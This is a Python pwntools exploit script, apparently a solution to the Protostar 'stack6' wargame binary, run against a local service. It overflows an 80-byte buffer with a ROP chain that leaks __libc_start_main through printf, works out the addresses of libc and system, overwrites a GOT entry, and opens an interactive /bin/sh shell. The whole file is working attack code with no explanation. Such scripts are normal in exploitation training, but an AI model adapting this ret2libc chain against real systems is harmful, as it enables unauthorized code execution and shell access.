#!/usr/bin/env python
from pwn import *
import time

HOST = '127.0.0.1'
PORT = 5678


target ="./stack6"
target_bin = ELF(target)

# process or remote instance
conn = ''
isRemote = not False
isRemote = True
isDebug  = not True
isPTY = not True

stdout = ''
stdin  = ''

# context
context.clear(arch=target_bin.arch)
context.log_level = 'debug'
#context.terminal = ['tmux', 'splitw', '-h']

# libc func
def libc_sym(sym):
	if libc_bin != None:
		return libc_bin.sym[sym]

def libc_str(s):
	if libc_bin != None:
		return libc_bin.search(s).next()

def pmsg(msg = ''):
  if msg == '':
	pause()
  else:
	log.warning('%s' % msg)
	pause()

if isPTY:
	stdout = stdin = process.PTY
else:
	stdout = stdin = subprocess.PIPE


if isRemote:
	conn = remote(HOST, PORT)
	pause()
else:
	conn = process(target, stdout=stdout, stdin=stdin)
	if isDebug:
#		open("pid", "wb").write("%d\n"%r.pid)
		gdb.attach(conn, '''b *0x80484aa''')
		pause()
'''
#isDebug
#open("pid", "wb").write("%d\n"%conn.pid)
# Wait for breakpoints, commands etc.
# raw_input("Send payload?")
'''


sizeofdummy = 80
pop1ret =  0x8048453
pop3ret = 0x08048576 # pop esi; pop edi; pop ebp; ret;
pop2ret = 0x08048577 # pop edi; pop ebp; ret;
#__libc_start_main_rel = 0x000199e0 # cgPwn
__libc_start_main_rel = 0x00019a00 # cgPwn /lib/i386-linux-gnu/libc.so.6
system_rel = 0x00040310

# print(bssprint esp
print conn.recvuntil("please: ")
payload = "A" * sizeofdummy
print "bss : "+hex(target_bin.bss())
print "gets : "+hex(target_bin.plt["gets"])

#leak __libc_start_main
payload += p32(target_bin.plt["gets"])
payload += p32(pop1ret)
payload += p32(target_bin.bss())

payload += p32(target_bin.plt["printf"])
payload += p32(pop2ret)
payload += p32(target_bin.bss())
payload += p32(target_bin.got["__libc_start_main"])

#read-write "/bin/sh"
payload += p32(target_bin.plt["gets"])
payload += p32(pop1ret)
payload += p32(target_bin.got["__libc_start_main"])
# system('bin/sh')
payload += p32(target_bin.plt['__libc_start_main'])
payload += p32(0xBBBB)
payload += p32(target_bin.got['__libc_start_main']+4)

conn.sendline(payload)
print "Send payload!!"
print conn.recvline()
#time.sleep(0.1)

conn.send("%x\x00")
print "Send %x!!"
__libc_start_main_addr = u32(conn.recv(4))
libc_base = __libc_start_main_addr - __libc_start_main_rel
system_addr = libc_base + system_rel
print "libc_base:{}".format(hex(libc_base))
conn.send(p32(system_addr) + "/bin/sh")
time.sleep(0.1)

conn.interactive()
